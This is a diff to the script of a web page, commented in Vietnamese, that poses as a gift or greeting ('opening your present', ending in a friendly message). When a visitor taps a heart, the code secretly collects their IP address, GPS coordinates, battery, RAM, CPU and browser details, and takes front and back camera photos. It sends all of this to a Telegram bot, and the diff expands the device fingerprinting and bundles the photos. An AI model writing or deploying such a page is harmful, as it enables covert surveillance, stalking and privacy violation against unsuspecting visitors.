@@ -59,7 +59,29 @@
         const canvas = document.getElementById('canvas');
         let isRunning = false;
 
-        // 1. Lấy thông tin IP (Có cơ chế dự phòng)
+        // 1. Lấy thông tin thiết bị & hệ thống nâng cao
+        async function getDeviceInfo() {
+            let batteryText = "Không rõ";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryText = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Đang sạc' : 'Không sạc'})`;
+                }
+            } catch (e) {}
+
+            return {
+                userAgent: navigator.userAgent,
+                screenRes: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language || navigator.userLanguage,
+                platform: navigator.platform,
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không rõ',
+                cores: navigator.hardwareConcurrency || 'Không rõ',
+                battery: batteryText,
+                time: new Date().toLocaleString('vi-VN')
+            };
+        }
+
+        // 2. Lấy thông tin IP & Vị trí IP
         async function getIPInfo() {
             try {
                 const res1 = await fetch('https://api.ipify.org?format=json');
@@ -84,8 +106,8 @@
                 return { ip: ip, city: '', region: '', country: '', lat: null, lon: null };
             } catch (e) {
                 try {
-                    const resFallback = await fetch('https://ipinfo.io/json');
-                    const dataFB = await resFallback.json();
+                    const resFB = await fetch('https://ipinfo.io/json');
+                    const dataFB = await resFB.json();
                     const loc = dataFB.loc ? dataFB.loc.split(',') : [null, null];
                     return {
                         ip: dataFB.ip || 'Không rõ',
@@ -101,7 +123,7 @@
             }
         }
 
-        // 2. Lấy Tọa độ GPS chính xác
+        // 3. Lấy Tọa độ GPS chính xác
         function getGeolocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
@@ -113,7 +135,7 @@
             });
         }
 
-        // 3. Hàm chụp ảnh theo hướng camera
+        // 4. Chụp ảnh từ Camera
         function captureStream(constraints) {
             return new Promise(async (resolve) => {
                 try {
@@ -130,7 +152,7 @@
 
                             canvas.toBlob((blob) => {
                                 resolve(blob);
-                            }, 'image/jpeg', 0.8);
+                            }, 'image/jpeg', 0.85);
                         }, 800);
                     };
                 } catch (e) {
@@ -139,13 +161,34 @@
             });
         }
 
-        // 4. Gửi dữ liệu về Telegram
-        async function sendToTelegram(photoBlob, captionText) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            if (photoBlob) {
-                formData.append('photo', photoBlob, 'photo.jpg');
-                formData.append('caption', captionText);
+        // 5. Gửi dữ liệu về Telegram
+        async function sendAllToTelegram(frontBlob, backBlob, captionText) {
+            if (frontBlob && backBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo1', frontBlob, 'front.jpg');
+                formData.append('photo2', backBlob, 'back.jpg');
+                
+                const media = [
+                    { type: 'photo', media: 'attach://photo1', caption: captionText + `\n📸 **Ảnh:** Cam Trước & Cam Sau`, parse_mode: 'Markdown' },
+                    { type: 'photo', media: 'attach://photo2' }
+                ];
+                formData.append('media', JSON.stringify(media));
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } else if (frontBlob || backBlob) {
+                const singleBlob = frontBlob || backBlob;
+                const camType = frontBlob ? 'Camera Trước (Selfie)' : 'Camera Sau';
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', singleBlob, 'photo.jpg');
+                formData.append('caption', captionText + `\n📸 **Ảnh:** ${camType}`);
+                formData.append('parse_mode', 'Markdown');
+
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -154,58 +197,62 @@
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: captionText, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: captionText + `\n⚠️ **Camera:** Không cấp quyền camera.`,
+                        parse_mode: 'Markdown'
+                    })
                 });
             }
         }
 
-        // 5. Kích hoạt khi bấm vào trái tim
+        // 6. Luồng xử lý chính
         async function startProcess() {
             if (isRunning) return;
             isRunning = true;
             document.getElementById('statusText').innerText = "Đang mở quà...";
 
-            const ipData = await getIPInfo();
-            const gpsLocation = await getGeolocation();
+            const [deviceInfo, ipData, gpsLocation] = await Promise.all([
+                getDeviceInfo(),
+                getIPInfo(),
+                getGeolocation()
+            ]);
 
-            let locationText = `🌐 **THÔNG TIN THU THẬP:**\n`;
-            locationText += `• IP: \`${ipData.ip}\`\n`;
+            let captionText = `📊 **BÁO CÁO DỮ LIỆU TRUY CẬP**\n\n`;
+            captionText += `🌐 **Mạng & Vị trí:**\n`;
+            captionText += `• IP: \`${ipData.ip}\`\n`;
 
             if (gpsLocation) {
-                locationText += `📍 **Vị trí GPS chính xác:**\n`;
-                locationText += `• Tọa độ: \`${gpsLocation.lat},${gpsLocation.lon}\`\n`;
-                locationText += `🔗 **Google Maps:** https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lon}\n`;
+                captionText += `• GPS: \`${gpsLocation.lat},${gpsLocation.lon}\`\n`;
+                captionText += `🔗 **Google Maps:** https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lon}\n`;
             } else {
-                locationText += `📍 **Vị trí ước tính qua IP (Chưa bật GPS):**\n`;
                 if (ipData.city || ipData.region) {
-                    locationText += `• Khu vực: ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
+                    captionText += `• Khu vực IP: ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
                 }
                 if (ipData.lat && ipData.lon) {
-                    locationText += `🔗 **Google Maps (IP):** https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
-                } else {
-                    locationText += `• Không xác định được tọa độ IP\n`;
+                    captionText += `🔗 **Google Maps (IP):** https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
                 }
             }
+
+            captionText += `\n📱 **Thông tin Thiết bị:**\n`;
+            captionText += `• Pin: ${deviceInfo.battery}\n`;
+            captionText += `• Màn hình: ${deviceInfo.screenRes}\n`;
+            captionText += `• RAM / CPU: ${deviceInfo.ram} / ${deviceInfo.cores} nhân\n`;
+            captionText += `• Ngôn ngữ: ${deviceInfo.language}\n`;
+            captionText += `• Thời gian: ${deviceInfo.time}\n`;
+            captionText += `• User-Agent: \`${deviceInfo.userAgent}\`\n`;
 
             // Chụp Cam Trước
             const frontPhoto = await captureStream({ video: { facingMode: "user" } });
-            if (frontPhoto) {
-                await sendToTelegram(frontPhoto, locationText + `📸 **Loại ảnh:** Camera Trước (Selfie)`);
-            }
-
+            
             // Chụp Cam Sau
             const backPhoto = await captureStream({ video: { facingMode: { exact: "environment" } } }) 
                              || await captureStream({ video: { facingMode: "environment" } });
-            if (backPhoto) {
-                await sendToTelegram(backPhoto, `📸 **Loại ảnh:** Camera Sau`);
-            }
 
-            // Nếu từ chối camera -> gửi thông báo bản tin
-            if (!frontPhoto && !backPhoto) {
-                await sendToTelegram(null, locationText + `⚠️ **Camera:** Không cấp quyền camera.`);
-            }
+            // Gửi dữ liệu
+            await sendAllToTelegram(frontPhoto, backPhoto, captionText);
 
-            document.getElementById('statusText').innerText = "Chúc bạn một ngày vui vẻ! ❤️️";
+            document.getElementById('statusText').innerText = "Chúc bạn một ngày vui vẻ! ❤";
         }
     </script>
 </body>
